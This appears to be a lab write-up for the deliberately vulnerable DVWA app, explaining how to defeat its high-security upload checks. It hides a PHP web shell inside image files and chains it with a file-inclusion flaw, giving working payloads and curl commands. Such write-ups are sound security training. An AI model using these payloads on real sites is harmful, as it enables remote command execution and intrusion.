# DVWA File Upload — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/upload/

## Source Code Behavior (High)
- Checks file extension: must end in `.jpg`, `.jpeg`, or `.png`
- Checks file size (< 100000 bytes)
- Checks image dimensions using `getimagesize()` — file must be a valid image
- `getimagesize()` reads actual file headers/magic bytes

## Key Differences from Medium
1. File extension is now checked (must be .jpg/.jpeg/.png)
2. `getimagesize()` verifies file is actually an image
3. Both content and extension are validated

## Bypass Techniques

### Image file with embedded PHP + LFI chain
1. Create a valid image with PHP code appended
2. Upload as `.jpg` — passes all checks
3. Use LFI vulnerability to include the uploaded image as PHP

### Creating a PHP-embedded image
```bash
# Copy a real JPEG and append PHP code
cp real_image.jpg shell.jpg
echo '<?php echo shell_exec($_GET["cmd"]); ?>' >> shell.jpg
```

### Using exiftool to embed PHP in EXIF data
```bash
exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' real_image.jpg
mv real_image.jpg shell.jpg
```

### GIF with PHP (GIF89a magic bytes)
Create `shell.php.jpg`:
```
GIF89a
<?php echo shell_exec($_GET['cmd']); ?>
```
The `GIF89a` header makes `getimagesize()` recognize it as a GIF.

## Step-by-Step Exploitation
1. Create image with embedded PHP code (exiftool method or GIF89a)
2. Upload as `shell.jpg` — passes extension and getimagesize() checks
3. Image uploaded to `hackable/uploads/shell.jpg`
4. Use File Inclusion vulnerability (high security): `?page=file:///var/www/html/dvwa/hackable/uploads/shell.jpg`
5. PHP code inside the image gets executed via LFI

## curl Commands
```bash
# Upload image with embedded PHP
curl -X POST "http://127.0.0.1:4280/vulnerabilities/upload/" \
  -F "uploaded=@shell.jpg;type=image/jpeg" \
  -F "Upload=Upload" \
  -b "PHPSESSID=<session>;security=high"

# Trigger execution via File Inclusion (LFI)
curl "http://127.0.0.1:4280/vulnerabilities/fi/?page=file:///var/www/html/dvwa/hackable/uploads/shell.jpg" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- Requires vulnerability chaining: File Upload + File Inclusion (LFI)
- `getimagesize()` only checks image headers — PHP code after the image data is ignored
- Extension check prevents direct PHP execution — need LFI to execute
- Demonstrates that defense-in-depth requires covering ALL attack vectors
- The `.jpg` file won't execute PHP directly — Apache won't process it as PHP
